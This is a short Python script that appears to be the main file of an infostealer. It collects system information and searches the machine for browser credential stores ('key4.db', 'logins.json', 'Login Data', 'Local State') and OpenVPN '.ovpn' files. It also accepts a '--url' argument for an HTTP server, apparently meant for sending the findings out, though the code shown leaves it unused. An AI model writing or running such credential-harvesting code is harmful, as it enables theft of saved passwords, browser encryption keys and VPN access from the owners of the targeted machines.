import argparse
import datetime
import glob
import itertools
import os
import re

from helpers import utils, find_files
from helpers import filemanager


def main(url):
    system_information = utils.system_information()
    search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State']
    search_files_regex = '|'.join([re.escape(file) for file in search_files])
    filemanager.search_files(search_files_regex)


if __name__ == '__main__':
    # Calling main function
    start_time = datetime.datetime.now()

    parser = argparse.ArgumentParser(description='URL Parameter')
    parser.add_argument('--url', dest='url', help='url parameter for http server')

    args = parser.parse_args()
    print()
    main(args.url)

    end_time = datetime.datetime.now()
    print('Duration: {}'.format(end_time - start_time))
